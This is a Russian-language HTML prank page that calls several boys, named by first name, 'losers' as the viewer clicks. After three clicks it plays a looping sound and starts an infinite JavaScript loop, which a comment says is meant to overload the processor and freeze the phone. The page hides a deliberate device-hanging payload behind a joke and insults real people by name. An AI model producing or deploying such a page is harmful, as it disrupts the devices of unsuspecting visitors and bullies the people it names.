<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Лохи</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 5rem;
            font-family: Arial, sans-serif;
            text-transform: uppercase;
            text-align: center;
            cursor: pointer;
            flex-direction: column;
        }
    </style>
</head>
<body onclick="changeText()">
    <div id="text">Тимофей лох</div>
    <audio id="sound" src="https://www.myinstants.com/media/sounds/zhestokie-stony.mp3"></audio>

    <script>
        const texts = ["Кирилл лох", "Макар лох", "Макс лох", "Витя лох"];
        let index = 0;
        let clickCount = 0;
        let sound = document.getElementById("sound");

        function changeText() {
            if (clickCount < 3) {
                index = (index + 1) % texts.length;
                document.getElementById("text").textContent = texts[index];
                clickCount++;
            } else {
                sound.loop = true;
                sound.play().catch(error => console.log("Ошибка автозапуска:", error));

                // Запускаем бесконечный цикл, нагружающий процессор
                while (true) {
                    console.log("Телефон зависает...");
                }
            }
        }
    </script>
</body>
</html>
